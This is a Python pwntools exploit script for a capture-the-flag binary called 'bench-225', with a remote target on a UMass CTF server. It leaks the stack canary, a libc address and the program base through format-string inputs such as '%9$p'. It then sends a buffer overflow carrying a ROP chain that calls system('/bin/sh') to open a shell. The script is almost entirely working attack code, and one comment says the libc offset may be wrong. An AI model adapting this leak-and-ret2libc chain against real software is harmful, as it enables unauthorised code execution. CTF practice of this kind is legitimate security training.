from pwn import *
from icecream import ic

elf = exe = ELF("./bench-225")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("bench-225.ctf.umasscybersec.org", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001a67
pie b 0x0000000000001ced
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

for i in range(3):
    ru("5. Remove Plate")
    sl('3')
    
for i in range(16):
    ru("5. Remove Plate")
    sl('4')

for i in range(2):
    ru("5. Remove Plate")
    sl('3')

ru("5. Remove Plate")
sl('6')
ru("Enter your motivational quote:")
sl("%9$p")
ru("Quote: \"")
canary = int(re(18).decode(), 16)

ru("5. Remove Plate")
sl('6')
ru("Enter your motivational quote:")
sl("%15$p")
ru("Quote: \"")
libc_leek = int(re(14).decode(), 16)

ru("5. Remove Plate")
sl('6')
ru("Enter your motivational quote:")
sl("%11$p")
ru("Quote: \"")
elf_leek = int(re(14).decode(), 16)
elf_base = elf_leek - 0x16a1
libc_base = libc_leek - 0x29d90     # ??? idk if this works
ic(hex(canary))
ic(hex(libc_leek))
ic(hex(elf_base))

pop_rdi = elf_base + 0x0000000000001336
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
ret = elf_base + 0x000000000000101a

payload = b'a'*8
payload += p64(canary)
payload += b'a'*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

ru("5. Remove Plate")
sl('6')
ru("Enter your motivational quote:")
sl(payload)

io.interactive()
